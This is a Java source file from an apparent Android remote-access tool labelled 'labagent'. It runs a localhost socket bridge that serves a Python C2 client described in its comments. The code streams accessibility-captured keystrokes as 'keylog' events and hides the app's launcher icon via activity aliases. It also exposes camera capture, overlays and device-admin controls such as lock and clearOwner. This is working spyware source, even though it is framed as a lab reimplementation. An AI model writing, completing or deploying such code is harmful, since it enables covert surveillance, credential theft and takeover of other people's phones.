package com.ref.labagent;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.List;

/**
 * 本地桥：Python 设备端（Termux，root）通过 127.0.0.1:8788 调**只有 App 组件才能做**的系统能力。
 *
 * 为什么这么分：C2 协议（注册/通道/163 条指令/帧格式）已经在 Python 侧跑通了，
 * 没必要在 Java 里重写一遍；Java 侧只提供那批"必须有 App 组件"的能力
 * （无障碍、悬浮窗、Camera2、设备管理员、Activity 别名、运行时权限）。
 *
 * 协议：一行一个 JSON。请求 {"cmd":"acc.tree"}，响应 {"ok":true,...}；
 * 另外服务端会**主动推** {"event":"keylog","pkg":...,"text":...}（无障碍文字变化）。
 */
public class Bridge {

    public static final int PORT = 8788;
    private static final String TAG = "labagent";
    private static ServerSocket server;
    private static Thread acceptThread;
    private static Context appCtx;
    private static final List<Client> CLIENTS = new ArrayList<>();
    private static volatile boolean running = false;

    public static Context app() { return appCtx; }

    /** 把一段要在主线程做的事丢回主线程并等结果 —— 悬浮窗/Camera2 都要求主线程 Looper。
     *  桥的请求线程是普通线程，直接调用会抛 "Can't create handler inside thread ..."（实测）。 */
    public static Object runOnMain(java.util.concurrent.Callable<Object> c, long waitMs) {
        final Object[] out = new Object[1];
        final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
        try {
            new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
                public void run() {
                    try {
                        out[0] = c.call();
                    } catch (Throwable t) {
                        out[0] = t;
                    } finally {
                        latch.countDown();
                    }
                }
            });
            latch.await(waitMs <= 0 ? 8000 : waitMs, java.util.concurrent.TimeUnit.MILLISECONDS);
        } catch (Throwable t) {
            return t;
        }
        return out[0];
    }

    public static boolean isRunning() { return running; }

    public static synchronized void start(Context c) {
        appCtx = c.getApplicationContext();
        if (running) {
            return;
        }
        try {
            server = new ServerSocket(PORT, 8, InetAddress.getByName("127.0.0.1"));
            running = true;
            acceptThread = new Thread(new Runnable() {
                @Override
                public void run() { acceptLoop(); }
            }, "lab-bridge");
            acceptThread.setDaemon(true);
            acceptThread.start();
            Log.i(TAG, "bridge listening on 127.0.0.1:" + PORT);
        } catch (Throwable t) {
            running = false;
            Log.e(TAG, "bridge start failed: " + t);
        }
    }

    private static void acceptLoop() {
        while (running) {
            try {
                final Socket s = server.accept();
                s.setTcpNoDelay(true);
                final Client cl = new Client(s);
                synchronized (CLIENTS) {
                    CLIENTS.add(cl);
                }
                Thread t = new Thread(new Runnable() {
                    @Override
                    public void run() { serve(cl); }
                }, "lab-bridge-conn");
                t.setDaemon(true);
                t.start();
            } catch (Throwable t) {
                if (running) {
                    try { Thread.sleep(200); } catch (Throwable ignored) {}
                }
            }
        }
    }

    private static void serve(Client cl) {
        try {
            BufferedReader in = new BufferedReader(
                    new InputStreamReader(cl.socket.getInputStream(), Charset.forName("UTF-8")));
            String line;
            while ((line = in.readLine()) != null) {
                JSONObject req;
                try {
                    req = new JSONObject(line);
                } catch (Throwable t) {
                    cl.send(new JSONObject().put("ok", false).put("err", "bad-json"));
                    continue;
                }
                JSONObject resp;
                try {
                    resp = Dispatch.run(appCtx, req);
                } catch (Throwable t) {
                    resp = new JSONObject().put("ok", false).put("err", String.valueOf(t));
                }
                cl.send(resp);
            }
        } catch (Throwable ignored) {
        } finally {
            synchronized (CLIENTS) {
                CLIENTS.remove(cl);
            }
            try { cl.socket.close(); } catch (Throwable ignored) {}
        }
    }

    /** 无障碍侧的文字变化：主动推给已连接的 Python 客户端（键盘记录） */
    public static void pushKeylog(String pkg, String text) {
        try {
            JSONObject o = new JSONObject();
            o.put("event", "keylog");
            o.put("pkg", pkg == null ? "" : pkg);
            o.put("text", text);
            o.put("ts", System.currentTimeMillis());
            List<Client> copy;
            synchronized (CLIENTS) {
                copy = new ArrayList<>(CLIENTS);
            }
            for (Client c : copy) {
                c.send(o);
            }
        } catch (Throwable ignored) {
        }
    }

    static class Client {
        final Socket socket;
        final OutputStream out;

        Client(Socket s) throws Exception {
            this.socket = s;
            this.out = s.getOutputStream();
        }

        synchronized void send(JSONObject o) {
            try {
                out.write((o.toString() + "\n").getBytes(Charset.forName("UTF-8")));
                out.flush();
            } catch (Throwable ignored) {
            }
        }
    }

    /** Activity 别名开关（原版 iconAlias / hideShortcuts / hideMyMainActivity） */
    public static String setAlias(Context c, String mode) {
        try {
            PackageManager pm = c.getPackageManager();
            String pkg = c.getPackageName();
            String[] aliases = new String[]{pkg + "/.AliasS", pkg + "/.AliasN",
                    pkg + "/" + MainActivity.class.getName()};
            int state;
            if ("show".equals(mode) || "normal".equals(mode)) {
                state = PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
            } else if ("hide".equals(mode)) {
                state = PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
            } else {
                state = PackageManager.COMPONENT_ENABLED_STATE_DEFAULT;
            }
            StringBuilder sb = new StringBuilder();
            for (String a : aliases) {
                try {
                    ComponentName cn = ComponentName.unflattenFromString(a);
                    pm.setComponentEnabledSetting(cn, state, PackageManager.DONT_KILL_APP);
                    sb.append(a).append("->").append(state).append(' ');
                } catch (Throwable t) {
                    sb.append(a).append("!").append(t).append(' ');
                }
            }
            return sb.toString();
        } catch (Throwable t) {
            return "err:" + t;
        }
    }

    public static String info() {
        return "sdk=" + Build.VERSION.SDK_INT + " model=" + Build.MODEL
                + " bridge=" + (running ? "up" : "down")
                + " acc=" + (appCtx != null && AccService.isEnabled(appCtx) ? "on" : "off")
                + " overlay=" + (appCtx != null && Overlay.canDraw(appCtx) ? "ok" : "no")
                + " admin=" + (appCtx != null && AdminReceiver.isActive(appCtx) ? "on" : "off")
                + " cam=" + Cam.state();
    }

    public static JSONArray caps() {
        JSONArray a = new JSONArray();
        a.put("acc.tree").put("acc.edits").put("acc.setText").put("acc.click")
                .put("acc.gesture").put("acc.global").put("acc.foreground")
                .put("overlay.show").put("overlay.close").put("overlay.state")
                .put("cam.open").put("cam.still").put("cam.close").put("cam.state")
                .put("admin.enable").put("admin.disable").put("admin.active")
                .put("admin.clearOwner").put("admin.lock").put("admin.biometric")
                .put("perm.status").put("perm.request").put("alias.set")
                .put("app.launch").put("app.info").put("app.icon").put("app.apkPath").put("info");
        return a;
    }
}
